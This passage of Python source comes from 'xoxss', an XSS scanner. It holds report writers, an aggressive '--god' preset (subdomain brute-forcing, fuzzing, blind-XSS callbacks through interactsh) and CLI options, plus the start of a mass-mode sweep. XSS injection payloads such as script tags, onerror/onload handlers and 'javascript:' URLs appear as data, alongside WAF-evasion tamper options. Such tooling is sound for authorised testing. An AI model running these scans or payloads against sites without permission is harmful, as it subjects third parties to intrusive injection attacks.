        if self.csp_issues:
            self.console.raw("")
            self.console.raw(f"{bcolors.BOLD}CSP bypass opportunities{bcolors.ENDC}")
            for issue in self.csp_issues[:5]:
                self.console.raw(f"  URL: {truncate(issue['url'], 120)}")
                for sub_issue in issue['issues'][:2]:
                    self.console.raw(f"    - {sub_issue}")

        if self.cors_issues:
            self.console.raw("")
            self.console.raw(f"{bcolors.BOLD}CORS misconfigurations{bcolors.ENDC}")
            for issue in self.cors_issues[:5]:
                self.console.raw(f"  URL: {truncate(issue['url'], 120)}")
                for sub_issue in issue['issues'][:2]:
                    self.console.raw(f"    - {sub_issue}")

        if self.trusted_types_issues:
            self.console.raw("")
            self.console.raw(f"{bcolors.BOLD}Trusted Types issues{bcolors.ENDC}")
            for item in self.trusted_types_issues[:5]:
                self.console.raw(f"  URL: {truncate(item['url'], 120)}")
                for sub_issue in item['issues'][:2]:
                    self.console.raw(f"    - {sub_issue}")

        if self.dom_clobber_findings:
            self.console.raw("")
            self.console.raw(f"{bcolors.BOLD}DOM clobbering{bcolors.ENDC}")
            for item in self.dom_clobber_findings[:5]:
                self.console.raw(
                    f"  [{item['severity']}]{bcolors.ENDC} {item['type']} "
                    f"-> {item['property']}  ({truncate(item['url'], 110)})"
                )

        if self.postmessage_findings:
            self.console.raw("")
            self.console.raw(f"{bcolors.BOLD}postMessage sinks{bcolors.ENDC}")
            for item in self.postmessage_findings[:5]:
                validated = "origin validated" if item['origin_validated'] else "NO origin check"
                self.console.raw(
                    f"  {item['sink']} ({validated}) - {truncate(item['url'], 110)}"
                )

        if self.websocket_findings:
            self.console.raw("")
            self.console.raw(f"{bcolors.BOLD}WebSocket sinks{bcolors.ENDC}")
            for item in self.websocket_findings[:5]:
                self.console.raw(
                    f"  {item['sink']} - {truncate(item['url'], 110)}"
                )
                self.console.raw(f"      {truncate(item['location'], 140)}")

        if self.file_upload_findings:
            self.console.raw("")
            self.console.raw(f"{bcolors.BOLD}File upload forms{bcolors.ENDC}")
            for item in self.file_upload_findings[:5]:
                self.console.raw(f"  {truncate(item['url'], 120)}")

        if self.graphql_endpoints:
            self.console.raw("")
            self.console.raw(f"{bcolors.BOLD}GraphQL endpoints{bcolors.ENDC}")
            for item in self.graphql_endpoints[:5]:
                flag = "introspection ENABLED" if item['introspection'] else "introspection off"
                self.console.raw(f"  {flag} - {truncate(item['url'], 120)}")

        if self.findings:
            self.console.raw("")
            self.console.raw(f"{bcolors.BOLD}XSS Findings{bcolors.ENDC}")
            ordered = {"confirmed": 0, "high": 1, "medium": 2, "low": 3}
            for finding in sorted(self.findings, key=lambda f: ordered.get(f.confidence, 9)):
                colour = {
                    "confirmed": bcolors.OKGREEN,
                    "high": bcolors.OKGREEN,
                    "medium": bcolors.WARNING,
                    "low": bcolors.GREY,
                }.get(finding.confidence, bcolors.ENDC)
                self.console.raw(
                    f"  {colour}[{finding.confidence}]{bcolors.ENDC} {finding.kind} - "
                    f"{finding.parameter} ({finding.method})"
                )
                self.console.raw(f"      {truncate(finding.url, 160)}")
        else:
            self.console.raw("")
            self.console.raw(f"  {bcolors.WARNING}No XSS findings were confirmed.{bcolors.ENDC}")

    # -- reports ----------------------------------------------------------------------
    def write_reports(self) -> None:
        formats = [item.strip().lower() for item in str(self.args.report).split(",") if item.strip()]
        if "none" in formats or not formats:
            return
        if "all" in formats:
            formats = ["json", "md", "html", "sarif"]
        report_dir = Path(self.args.report_dir)
        try:
            report_dir.mkdir(parents=True, exist_ok=True)
        except OSError as exc:
            self.console.warn(f"Cannot create report directory {report_dir}: {exc}")
            return

        host = slugify(urlsplit(self.target).hostname or "target")
        tag = hashlib.sha1(self.target.encode("utf-8", "replace")).hexdigest()[:6]
        stamp = datetime.now().strftime("%Y%m%d-%H%M%S-%f")
        written: List[str] = []
        for fmt in formats:
            if fmt not in ("json", "md", "html", "sarif"):
                continue
            path = report_dir / f"xoxss-{host}-{tag}-{stamp}.{fmt}"
            try:
                if fmt == "json":
                    write_json_report(path, self)
                elif fmt == "md":
                    write_markdown_report(path, self)
                elif fmt == "sarif":
                    write_sarif_report(path, self)
                else:
                    write_html_report(path, self)
                written.append(str(path))
                latest = report_dir / f"xoxss-{host}-{tag}-latest.{fmt}"
                try:
                    shutil.copyfile(path, latest)
                except OSError:
                    pass
            except Exception as exc:
                self.console.warn(f"Failed to write {fmt} report: {exc}")

        if written:
            self.console.info("Reports: " + ", ".join(written), important=False)

# --------------------------------------------------------------------------------------
# Reports
# --------------------------------------------------------------------------------------


def payload_for_kind(kind: str) -> str:
    if kind == "html":
        return '<img src=x onerror="/* XOX$$ marker */">'
    return "/* XOX$$ JavaScript marker */"


def build_sarif(scanner: XSSScanner) -> Dict[str, Any]:
    """Thin adapter over :func:`xoxss.reports.sarif.build_sarif_document`."""
    return build_sarif_document(
        scanner.findings,
        target=scanner.target,
        waf_names=scanner.waf.names,
        duration_seconds=scanner.stats.elapsed,
        endpoint_count=len(scanner.endpoints),
        truncated_responses=getattr(scanner.stats, "truncated_responses", 0),
        blind_markers=scanner.blind_markers,
        tool_name=APP_NAME,
        tool_version=VERSION,
    )


def write_sarif_report(path: Path, scanner: XSSScanner) -> None:
    path.write_text(json.dumps(build_sarif(scanner), indent=2, ensure_ascii=False), encoding="utf-8")



# --------------------------------------------------------------------------------------
# CLI
# --------------------------------------------------------------------------------------

EXAMPLES = """
examples:
  xoxss https://target.tld --crawl --headless
  xoxss https://target.tld/?q=1 --browser chrome --headless --dom
  xoxss https://target.tld --god
  xoxss https://target.tld --deep --report all
  xoxss https://target.tld --god
  xoxss https://target.tld --deep --report all
  xoxss -l targets.txt --threads 20 --rate-limit 15 --report all
  xoxss https://target.tld --no-browser --report-reflections --report json
  xoxss https://target.tld --tamper all --max-payloads 12 --scan-headers
  xoxss https://target.tld --stored --stored-pages 20 --screenshot
"""


# --------------------------------------------------------------------------------------
# god mode (--god / --yolo)
# --------------------------------------------------------------------------------------

_GOD_BROWSERS: Dict[str, Tuple[Tuple[str, ...], Tuple[str, ...]]] = {
    # kind -> (PATH command names, direct binary locations relative to install dirs)
    "chrome": (
        ("chrome", "chrome.exe", "google-chrome", "google-chrome-stable"),
        (r"Google\Chrome\Application\chrome.exe",),
    ),
    "chromium": (
        ("chromium", "chromium.exe", "chromium-browser"),
        (r"Chromium\Application\chromium.exe",),
    ),
    "edge": (
        ("msedge", "msedge.exe", "microsoft-edge", "microsoft-edge-stable"),
        (r"Microsoft\Edge\Application\msedge.exe",),
    ),
    "firefox": (
        ("firefox", "firefox.exe"),
        (r"Mozilla Firefox\firefox.exe",),
    ),
}


def _locate_browser(kind: str) -> Optional[str]:
    """Find a local browser binary: PATH name first, then common install dirs."""
    names, locations = _GOD_BROWSERS.get(kind, ((kind,), ()))
    for name in names:
        found = shutil.which(name)
        if found:
            return found
    bases: List[Path] = []
    if os.name == "nt":
        for env in ("ProgramFiles", "ProgramFiles(x86)", "LocalAppData"):
            value = os.environ.get(env)
            if value and Path(value).is_dir():
                bases.append(Path(value))
    for relative in locations:
        for base in bases:
            candidate = base / relative
            if candidate.is_file():
                return str(candidate)
    return None


def _god_browser_choice() -> Optional[Tuple[str, Optional[str]]]:
    """Best browser backend for god mode: Playwright first, then local engines."""
    with suppress(Exception):
        import playwright  # noqa: F401

        return "playwright", None
    for kind in ("chrome", "edge", "firefox", "chromium"):
        binary = _locate_browser(kind)
        if binary:
            return kind, binary
    return None


def apply_god_preset(
    args: argparse.Namespace,
    console: "Console",
    user_flags: Set[str],
) -> None:
    """``--god`` / ``--yolo`` preset: every capability on without further input.

    Budgets are raised to aggressive-but-safe maximums; explicit command-line
    flags always win so the user can still pin individual settings.
    """

    def unclaimed(*flags: str) -> bool:
        return not any(flag in user_flags for flag in flags)

    def bump(attr: str, value: Any, flag: Optional[str] = None) -> None:
        if flag and not unclaimed(flag):
            return
        current = getattr(args, attr, None)
        if current is None:
            setattr(args, attr, value)
        else:
            setattr(args, attr, max(current, value))

    recon = HAS_RECON

    # -- discovery ----------------------------------------------------------------------
    args.crawl = True
    bump("crawl_depth", 6, "--crawl-depth")
    bump("max_urls", 3000, "--max-urls")
    bump("js_files", 60, "--js-files")
    if unclaimed("--no-discover"):
        args.discover = True
    args.discover_paths = True
    args.fuzz_paths = True
    if unclaimed("--no-fuzz-params"):
        args.fuzz_params = True
    bump("fuzz_param_limit", 25, "--fuzz-param-limit")
    if recon:
        args.subdomains = True
        args.passive_urls = True
        args.openapi = True
        args.mine_params = True
        args.allow_subdomains = True
        bump("subdomain_brute", 50, "--subdomain-brute")

    # -- injection ----------------------------------------------------------------------
    bump("max_payloads", 16, "--max-payloads")
    if getattr(args, "remote_payloads", True):
        bump("payload_limit", 1500, "--payload-limit")
    args.scan_headers = True
    args.stored = True
    bump("stored_pages", 20, "--stored-pages")
    args.report_reflections = True

    # -- advanced analysis (cheap, HTTP-level) -------------------------------------------
    args.polyglot = True
    args.jsonp = True
    args.csp_analyze = True
    args.cors_analyze = True
    args.proto_pollution = True
    args.mxss = True
    args.smart_rate = True
    args.dom_clobbering = True
    args.trusted_types = True
    args.graphql = True
    args.websocket = True
    args.file_upload = True
    args.postmessage = True

    # -- network -------------------------------------------------------------------------
    bump("threads", 20, "--threads")
    bump("concurrency", 32, "--concurrency")
    bump("timeout", 30.0, "--timeout")
    bump("retries", 2, "--retries")

    # -- browser / evidence ---------------------------------------------------------------
    if args.no_browser or not unclaimed("--no-browser"):
        args.confirm = "http"
    else:
        if unclaimed("--browser"):
            choice = _god_browser_choice()
            if choice is not None:
                kind, binary = choice
                args.browser = kind
                if binary and not args.binary and unclaimed("--binary"):
                    args.binary = binary
            else:
                console.warn(
                    "God mode: no local browser found - continuing HTTP-only (equivalent to --no-browser)"
                )
                args.no_browser = True
                args.confirm = "http"
        if not args.no_browser:
            bump("browser_workers", 2, "--browser-workers")
            args.headless = True
            args.screenshot = True

    # -- blind XSS / out-of-band -----------------------------------------------------------
    configured_oob = bool(
        getattr(args, "blind", None)
        or getattr(args, "interactsh", None)
        or getattr(args, "oob_poll", None)
        or getattr(args, "oob_file", None)
    )
    if (
        not configured_oob
        and recon
        and InteractshClient is not None
        and unclaimed("--interactsh")
    ):
        try:
            import cryptography  # noqa: F401
        except Exception:
            console.warn("God mode: cryptography missing - automatic blind-XSS callbacks disabled")
        else:
            args.interactsh = "oast.pro"
            bump("oob_wait", 45.0, "--oob-wait")

    # -- external tools ---------------------------------------------------------------------
    if HAS_RECON and ExternalToolkit is not None and unclaimed("--external-tools") and not args.external_tools:
        tools: Dict[str, Any] = {}
        with suppress(Exception):
            tools = available_tools() or {}
        if any(name in tools for name in ("dalfox", "nuclei", "subfinder", "gau", "katana", "arjun", "x8")):
            args.external_tools = True


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="xoxss",
        description=f"{APP_NAME} v{VERSION} - advanced, persistent, context-aware XSS scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=EXAMPLES,
    )
    parser.add_argument("target", nargs="*", help="target URL(s); http:// is assumed when missing")
    parser.add_argument("-l", "--target-list", help="file with one target URL/domain per line")
    parser.add_argument("--version", action="version", version=f"{APP_NAME} {VERSION}")
    parser.add_argument(
        "--profile", choices=("quick", "balanced", "deep"), default="balanced",
        help="scan preset: quick (HTTP-only, local payloads), balanced (default), or deep",
    )

    crawl = parser.add_argument_group("discovery")
    crawl.add_argument("--crawl", action="store_true", help="crawl the target before scanning")
    crawl.add_argument(
        "--deep",
        action="store_true",
        help="deep crawl preset: depth 5, 1500 URLs, robots/sitemap/JS + path discovery, parameter fuzzing",
    )
    godmode = parser.add_argument_group("god mode")
    godmode.add_argument(
        "--god",
        "--yolo",
        dest="god",
        action="store_true",
        help="full-automatic maximum-aggression preset: recon + deep crawl + fuzzing + browser "
        "verification + interactsh blind-XSS + external tools; no other flags needed",
    )
    crawl.add_argument("--crawl-depth", type=int, default=3, help="crawl depth (default: 3)")
    crawl.add_argument("--max-urls", type=int, default=500, help="maximum URLs to scan (default: 500)")
    crawl.add_argument("--allow-subdomains", action="store_true", help="treat subdomains as in scope")
    crawl.add_argument("--include", nargs="+", help="regexes URLs must match")
    crawl.add_argument("--exclude", nargs="+", help="regexes URLs must not match")
    crawl.add_argument(
        "--discover",
        dest="discover",
        action="store_true",
        default=True,
        help="discover endpoints from robots.txt, sitemaps and JavaScript (default: on when crawling)",
    )
    crawl.add_argument("--no-discover", dest="discover", action="store_false", help="disable robots/sitemap/JS discovery")
    crawl.add_argument("--discover-paths", action="store_true", help="probe common endpoint paths")
    crawl.add_argument("--endpoint-wordlist", help="extra endpoint paths to probe, one per line")
    crawl.add_argument("--js-files", type=int, default=25, help="maximum JavaScript files parsed per scan (default: 25)")
    crawl.add_argument(
        "--fuzz-params",
        dest="fuzz_params",
        action="store_true",
        default=False,
        help="test common parameter names on endpoints without a query string",
    )
    crawl.add_argument("--no-fuzz-params", dest="fuzz_params", action="store_false", help="disable parameter fuzzing")
    crawl.add_argument("--fuzz-param-limit", type=int, default=10, help="parameter names per endpoint (default: 10)")
    crawl.add_argument(
        "--subdomains",
        action="store_true",
        help="enumerate passive subdomains (crt.sh, certspotter, OTX, urlscan) before scanning",
    )
    crawl.add_argument(
        "--subdomain-brute",
        type=int,
        default=0,
        metavar="N",
        help="also resolve the first N built-in/wordlist subdomain candidates",
    )
    crawl.add_argument(
        "--passive-urls",
        action="store_true",
        help="collect historic URLs from Wayback, Common Crawl, urlscan and OTX",
    )
    crawl.add_argument(
        "--openapi",
        action="store_true",
        help="discover OpenAPI/Swagger documents and test their query/body parameters",
    )
    crawl.add_argument(
        "--fuzz-paths",
        action="store_true",
        help="brute-force common paths with the internal soft-404-aware fuzzer",
    )
    crawl.add_argument(
        "--mine-params",
        action="store_true",
        help="mine hidden query parameters by response delta and reflection",
    )
    crawl.add_argument(
        "--external-tools",
        action="store_true",
        help="use installed recon, parameter discovery (arjun/x8), and XSS verification tools",
    )

    injection = parser.add_argument_group("injection")
    injection.add_argument(
        "--payload-file",
        help="custom payloads or JSON lists ('context|payload' supported; repeat with ':').",
    )
    injection.add_argument(
        "--payload-dir",
        action="append",
        metavar="DIR",
        help="load every .txt/.lst/.json payload corpus under DIR (repeatable)",
    )
    injection.add_argument(
        "--lazy-payloads",
        dest="lazy_payloads",
        action="store_true",
        default=True,
        help="load the bundled LazyXss payload pack (default: on)",
    )
    injection.add_argument(
        "--no-lazy-payloads",
        dest="lazy_payloads",
        action="store_false",
        help="disable the bundled LazyXss payload pack",
    )
    injection.add_argument(
        "--remote-payloads",
        dest="remote_payloads",
        action="store_true",
        default=True,
        help="download XSS payload lists from GitHub into temp storage (default: on)",
    )
    injection.add_argument(
        "--no-remote-payloads",
        dest="remote_payloads",
        action="store_false",
        help="disable the remote payload download",
    )
    injection.add_argument(
        "--payload-source",
        action="append",
        metavar="URL",
        help="extra GitHub raw payload URL (repeatable)",
    )
    injection.add_argument("--payload-limit", type=int, default=600, help="maximum remote payloads to keep (0 = unlimited, capped internally; default: 600)")
    injection.add_argument("--payload-tmp-dir", help="temp directory for downloaded payloads (default: system temp)")
    injection.add_argument("--keep-payloads", action="store_true", help="keep downloaded payloads after the scan")
    injection.add_argument(
        "--tamper",
        choices=sorted(TAMPERS.keys()) + ["all"],
        help="payload evasion transform",
    )
    injection.add_argument(
        "--encoder",
        action="append",
        metavar="NAME",
        help="encoder registry transform applied after --tamper (repeatable; see --list-encoders)",
    )
    injection.add_argument("--max-payloads", type=int, default=6, help="payloads per injection point (default: 6)")
    injection.add_argument("--scan-headers", action="store_true", help="test header reflection")
    injection.add_argument("--header-list", nargs="+", help="custom header names to inject")
    injection.add_argument("--dom", dest="dom", action="store_true", default=True, help="DOM XSS analysis (default: on)")
    injection.add_argument("--no-dom", dest="dom", action="store_false", help="disable DOM XSS analysis")
    injection.add_argument("--stored", action="store_true", help="look for persisted (stored) payloads")
    injection.add_argument("--stored-pages", type=int, default=10, help="pages checked for stored XSS (default: 10)")
    injection.add_argument(
        "--report-reflections",
        action="store_true",
        help="also report reflections / static candidates that could not be executed",
    )
    injection.add_argument(
        "--check-libs",
        dest="check_libs",
        action="store_true",
        default=True,
        help="check for vulnerable JavaScript libraries (default: on)",
    )
    injection.add_argument("--no-check-libs", dest="check_libs", action="store_false", help="disable library vulnerability checking")
    injection.add_argument(
        "--blind",
        metavar="CALLBACK_URL",
        help="blind XSS callback URL (XSS Hunter / Burp Collaborator / interactsh); "
        "injects out-of-band probes into every parameter and form",
    )

    oob = parser.add_argument_group("out-of-band")
    oob.add_argument(
        "--interactsh",
        nargs="?",
        const="oast.pro",
        metavar="SERVER",
        help="register with an interactsh server and poll it to confirm blind-XSS callbacks",
    )
    oob.add_argument(
        "--oob-poll",
        metavar="URL",
        help="poll a JSON/text collector endpoint for markers (XSS Hunter, Burp bridge, ...)",
    )
    oob.add_argument(
        "--oob-file",
        metavar="PATH",
        help="tail a local JSON-lines/text collector file (requires --blind for the callback)",
    )
    oob.add_argument("--oob-interval", type=float, default=5.0, help="seconds between OOB polls (default: 5)")
    oob.add_argument(
        "--oob-wait",
        type=float,
        default=0.0,
        help="seconds to wait after the scan for late out-of-band callbacks",
    )

    # Advanced features (Phase 1 & 2)
    advanced = parser.add_argument_group("advanced")
    advanced.add_argument("--polyglot", action="store_true", help="use polyglot payloads for faster scanning")
    advanced.add_argument("--per-char-probe", action="store_true", help="use per-character probing for precise context detection")
    advanced.add_argument("--jsonp", action="store_true", help="detect and test JSONP endpoints for XSS")
    advanced.add_argument("--csp-analyze", action="store_true", help="analyze CSP headers for bypass opportunities")
    advanced.add_argument("--mxss", action="store_true", help="detect mutation XSS vulnerabilities")
    advanced.add_argument("--proto-pollution", action="store_true", help="detect prototype pollution vulnerabilities")
    advanced.add_argument("--cors-analyze", action="store_true", help="analyze CORS misconfigurations")
    advanced.add_argument("--smart-rate", action="store_true", help="use adaptive smart rate limiting")
    advanced.add_argument("--dom-clobbering", action="store_true", help="detect DOM clobbering vulnerabilities")
    advanced.add_argument("--trusted-types", action="store_true", help="analyze Trusted Types CSP directive")
    advanced.add_argument("--graphql", action="store_true", help="detect GraphQL XSS vulnerabilities")
    advanced.add_argument("--websocket", action="store_true", help="detect WebSocket XSS vulnerabilities")
    advanced.add_argument("--file-upload", action="store_true", help="detect file upload XSS vulnerabilities")
    advanced.add_argument("--postmessage", action="store_true", help="detect postMessage XSS vulnerabilities")

    browser = parser.add_argument_group("browser")
    browser.add_argument(
        "--browser",
        choices=["firefox", "chrome", "chromium", "edge", "playwright"],
        default="firefox",
        help="browser backend for verification: selenium firefox/chrome/edge or playwright (default: firefox)",
    )
    browser.add_argument("--headless", action="store_true", help="run the browser headless")
    browser.add_argument("--no-browser", action="store_true", help="HTTP-only mode (no Selenium)")
    browser.add_argument("--browser-workers", type=int, default=1, help="parallel browser instances (default: 1)")
    browser.add_argument("--confirm", choices=["auto", "browser", "http"], default="auto", help="verification strategy")
    browser.add_argument("--screenshot", action="store_true", help="save a screenshot for confirmed findings")
    browser.add_argument("--binary", help="explicit browser binary path")
    browser.add_argument("--user-agent", default=USER_AGENT, help="User-Agent override")

    network = parser.add_argument_group("network")
    network.add_argument("--threads", type=int, default=10, help="parallel URL workers (default: 10)")
    network.add_argument("--concurrency", type=int, default=16, help="parallel HTTP requests (default: 16)")
    network.add_argument("--timeout", type=float, default=20.0, help="request/browser timeout in seconds")
    network.add_argument("--retries", type=int, default=2, help="retries per request (default: 2)")
    network.add_argument("--rate-limit", type=float, default=0.0, help="requests per second (0 = unlimited)")
    network.add_argument("--proxy", help="HTTP(S) proxy, e.g. http://127.0.0.1:8080")
    network.add_argument("--insecure", action="store_true", help="ignore TLS certificate errors")
    network.add_argument(
        "--max-response-bytes", type=int, default=5 * 1024 * 1024,
        metavar="N", help="maximum response body bytes analyzed (default: 5242880)",
    )
    network.add_argument("--headers", nargs="+", help="extra headers: 'Name: Value'")
    network.add_argument("--cookies", nargs="+", help="cookies: 'name=value' or 'a=b; c=d'")

    mass = parser.add_argument_group("mass mode")
    mass.add_argument(
        "--mass",
        action="store_true",
        help="stateless fast sweep: one request per parameter, no crawl/browser/state",
    )
    mass.add_argument(
        "--mass-params",
        metavar="NAMES",
        default="",
        help="comma-separated parameters tried on URLs without a query string",
    )
    mass.add_argument(
        "--mass-payloads",
        type=int,
        default=4,
        help="payloads tried per parameter in mass mode (default: 4)",
    )
    mass.add_argument(
        "--jsonl",
        metavar="PATH",
        help="append one JSON finding per line (mass mode or --param-audit)",
    )

    params = parser.add_argument_group("parameter audit")
    params.add_argument(
        "--param-audit",
        action="store_true",
        help="collect Wayback parameters and probe each one for reflection (collector + Gxss style) and exit",
    )
    params.add_argument(
        "--param-input",
        metavar="PATH",
        help="read seed URLs from a file (when set alone, Wayback harvesting is skipped)",
    )
    params.add_argument(
        "--param-source",
        choices=["wayback", "passive", "both", "none"],
        help="URL source for --param-audit (default: wayback, or none when --param-input is used)",
    )
    params.add_argument(
        "--param-limit",
        type=int,
        default=5000,
        help="maximum historic URLs to harvest for parameter audit (default: 5000)",
    )
    params.add_argument(
        "--param-max-checks",
        type=int,
        default=10000,
        help="maximum parameter reflection checks per audit (default: 10000)",
    )
    params.add_argument(
        "--param-marker",
        default="XoxssReflect",
        help="alphanumeric reflection marker used for each parameter (default: XoxssReflect)",
    )
    params.add_argument(
        "--param-data",
        metavar="BODY",
        help="POST form body for Gxss-style checks, e.g. 'user=test&pass=test'",
    )
    params.add_argument(
        "--param-output",
        metavar="PATH",
        help="write the parameter-audit JSON report to this file",
    )
    params.add_argument(
        "--param-subs",
        dest="param_subs",
        action="store_true",
        default=True,
        help="include subdomains in Wayback harvesting (default: on)",
    )
    params.add_argument(
        "--no-param-subs",
        dest="param_subs",
        action="store_false",
        help="only harvest the exact host, not its subdomains",
    )

    output = parser.add_argument_group("output")
    output.add_argument("-o", "--output", help="write the full text log to this file")
    output.add_argument("--report", default="all", help="json, md, html, sarif, all or none (default: all)")
    output.add_argument("--report-dir", default=os.path.join(DEFAULT_STATE_DIR, "reports"), help="report directory")
    output.add_argument(
        "--events-jsonl", metavar="PATH",
        help="write versioned JSONL scan lifecycle, discovery, and finding events",
    )
    output.add_argument("--verbose", action="store_true", help="verbose (debug) output")
    output.add_argument("--quiet", action="store_true", help="only print findings and errors")
    output.add_argument("--no-color", action="store_true", help="disable ANSI colours")
    output.add_argument("--fail-on-findings", action="store_true", help="exit with status 2 when findings exist")

    persistence = parser.add_argument_group("persistence")
    persistence.add_argument("--state-dir", default=DEFAULT_STATE_DIR, help="state/report root (default: .xoxss)")
    persistence.add_argument("--no-state", action="store_true", help="disable checkpoints")
    persistence.add_argument("--no-resume", action="store_true", help="ignore and reset the existing checkpoint")

    misc = parser.add_argument_group("misc")
    misc.add_argument("--list-payloads", action="store_true", help="print built-in payloads and exit")
    misc.add_argument("--doctor", action="store_true", help="check the installation and exit")
    misc.add_argument("--list-tampers", action="store_true", help="print available tampers and exit")
    misc.add_argument(
        "--list-encoders", action="store_true", help="print the encoder registry and exit"
    )
    return parser


def print_payloads() -> None:
    for context in PayloadEngine.CONTEXTS:
        print(f"\n[{context}]")
        for template in DEFAULT_PAYLOADS[context]:
            print(f"  {template}")
    try:
        with open(LAZY_PAYLOAD_FILE, "r", encoding="utf-8-sig", errors="replace") as handle:
            bundled = sum(1 for line in handle if line.strip())
    except OSError:
        bundled = 0
    print(
        f"\n[Bundled LazyXss pack] {bundled} payload(s) at {LAZY_PAYLOAD_FILE} "
        "(enabled by default; disable with --no-lazy-payloads)"
    )


def print_tampers() -> None:
    print("Available tamper transforms:")
    for name in sorted(TAMPERS):
        print(f"  {name}")
    print(f"  all  (chain: {' -> '.join(TAMPER_CHAINS['all'])})")


def print_encoders() -> None:
    if not HAS_RECON or describe_encoders is None:
        print("Encoder registry unavailable (recon modules failed to import).")
        return
    print("Available encoders (use --encoder NAME, repeatable):")
    print(describe_encoders())


def run_doctor(console: Console, args: argparse.Namespace) -> int:
    """Report whether this installation can run the requested features."""
    problems = 0
    warnings = 0

    def report(status: str, name: str, detail: str) -> None:
        nonlocal problems, warnings
        if status == "fail":
            problems += 1
        elif status == "warn":
            warnings += 1
        colour = {"ok": bcolors.OKGREEN, "warn": bcolors.WARNING, "fail": bcolors.FAIL}[status]
        if _ui is not None and _ui.enabled():
            gl = _ui.glyphs()
            glyph = {"ok": gl["tick"], "warn": gl["warn"], "fail": gl["cross"]}[status]
            glyph_part = f"{colour}{glyph}{bcolors.ENDC} "
        else:
            glyph_part = ""
        label_style = f"{colour}{status:<4}{bcolors.ENDC}"
        console.raw(f"  {glyph_part}{label_style} {bcolors.GREY}{name:<20}{bcolors.ENDC} {detail}")

    console.raw("")
    console.rule("environment check")
    console.raw(f"  {bcolors.DIM}{APP_NAME} {VERSION} - verifying the installation{bcolors.ENDC}")
    console.raw("")

    if sys.version_info >= (3, 9):
        report("ok", "python", sys.version.split()[0])
    else:
        report("fail", "python", f"{sys.version.split()[0]} (>=3.9 required)")

    for module, required, extra in (
        ("aiohttp", True, "core HTTP engine"),
        ("bs4", True, "HTML parsing"),
        ("cryptography", False, "--interactsh decryption"),
        ("playwright", False, "--browser playwright"),
        ("selenium", False, "default browser backend"),
        ("uvloop", False, "faster event loop (non-Windows)"),
    ):
        try:
            __import__(module)
        except Exception:
            report("fail" if required else "warn", module, f"missing ({extra})")
        else:
            report("ok", module, extra)

    if HAS_RECON:
        tools = available_tools()
        present = [name for name, path in tools.items() if path]
    else:
        present = []
        report("warn", "recon modules", str(globals().get("_RECON_IMPORT_ERROR", "not importable")))
    report(
        "ok" if present else "warn",
        "external tools",
        ", ".join(present) if present else "none found (optional: subfinder/gau/katana/arjun/x8/dalfox/nuclei)",
    )

    state_dir = Path(args.state_dir)
    try:
        state_dir.mkdir(parents=True, exist_ok=True)
        probe = state_dir / ".doctor-write-test"
        probe.write_text("ok", encoding="utf-8")
        probe.unlink(missing_ok=True)
    except OSError as exc:
        report("fail", "state dir", f"{state_dir} not writable ({exc})")
    else:
        report("ok", "state dir", str(state_dir))

    if args.no_browser:
        report("ok", "browser", "disabled by --no-browser")
    else:
        backend = (args.browser or "firefox").lower()
        if backend == "playwright":
            try:
                import playwright  # noqa: F401
            except Exception:
                report("fail", "browser", "--browser playwright but playwright is not installed")
            else:
                report("ok", "browser", "playwright (run: playwright install chromium)")
        else:
            try:
                import selenium  # noqa: F401
            except Exception:
                report("fail", "browser", f"{backend} needs selenium: pip install selenium")
            else:
                report("ok", "browser", f"selenium/{backend}")

    console.raw("")
    if problems:
        console.error(f"{problems} required component(s) missing, {warnings} warning(s)")
        return 1
    console.ok(f"Ready. {warnings} optional warning(s).")
    if _ui is not None and _ui.enabled():
        console.raw(f"  {_ui.rule('')}")
    return 0


def install_uvloop() -> None:
    # uvloop's DNS path can leave an unobserved getaddrinfo exception on
    # Python 3.14 when DNS is temporarily unavailable. Keep asyncio's native
    # loop there until uvloop's 3.14 resolver behavior is reliable.
    if sys.platform == "win32" or sys.version_info >= (3, 14):
        return
    try:
        import uvloop  # type: ignore

        uvloop.install()
    except Exception:
        pass


def gather_targets(args: argparse.Namespace, console: Console) -> Optional[List[str]]:
    """Read targets from arguments, ``--target-list`` or a piped stdin stream."""
    targets: List[str] = []
    if args.target_list:
        try:
            with open(args.target_list, "r", encoding="utf-8-sig", errors="replace") as handle:
                for line in handle:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        targets.append(line)
        except OSError as exc:
            console.error(f"Cannot read target list {args.target_list}: {exc}")
            return None
    targets.extend(args.target or [])

    if not targets and not sys.stdin.isatty():
        try:
            targets.extend(
                line.strip()
                for line in sys.stdin
                if line.strip() and not line.lstrip().startswith("#")
            )
            if targets:
                console.info(f"Read {len(targets)} target(s) from stdin", important=False)
        except OSError as exc:
            console.error(f"Cannot read targets from stdin: {exc}")
            return None

    unique_targets: List[str] = []
    seen_targets: Set[str] = set()
    for target in targets:
        cleaned = target.strip()
        key = cleaned.lower().rstrip("/")
        if cleaned and key not in seen_targets:
            seen_targets.add(key)
            unique_targets.append(cleaned)
    return unique_targets


# Stateless "mass" mode: one request per parameter, no crawl, no browser, no state.
# Payloads use the same quote-free marker as the full scanner so a hit is still
# distinguishable from a benign reflection, but the check stays substring-based.
MASS_PAYLOADS: Tuple[str, ...] = (
    "<script>{m}</script>",
    '\"><img src=x onerror={m}>',
    "'>\"><svg onload={m}>",
    "javascript:{m}//",
)

MASS_PARAMETERS: Tuple[str, ...] = (
    "q",
    "s",
    "search",
    "query",
    "id",
    "pagina",
    "page",
    "lang",
    "callback",
    "url",
    "redirect",
    "next",
)


async def run_mass(args: argparse.Namespace, console: Console) -> Tuple[int, int]:
    """Fast reflected-XSS sweep for very large URL lists.

    Deliberately narrow: existing query parameters are rewritten one at a time,
    URLs without a query get a short list of common parameter names, and only
    HTTP evidence is collected.  This is the path for tens of thousands of URLs;
    the full scanner remains the path for browser-confirmed findings.
    """
    targets = gather_targets(args, console)
    if targets is None:
        return 1, 0
    if not targets:
        console.error("No target supplied. Run with --help for usage.")
        return 1, 0

    stats = ScanStats(urls_total=len(targets))
    engine = PayloadEngine(
        console,
        args.payload_file,
        corpus_dirs=getattr(args, "payload_dir", None),
        lazy_payloads=getattr(args, "lazy_payloads", True),
    )
    http = HttpEngine(
        console,
        stats,
        headers=XSSScanner._parse_headers(args.headers),
        cookies=XSSScanner._parse_cookies(args.cookies),
        timeout=args.timeout,
        retries=args.retries,
        rate=args.rate_limit,
        concurrency=args.concurrency,
        proxy=args.proxy,
        insecure=args.insecure,
        redirect_scope=lambda candidate: any(
            Scope(target, args.allow_subdomains, args.include, args.exclude).in_scope(candidate)
            for target in targets
        ),
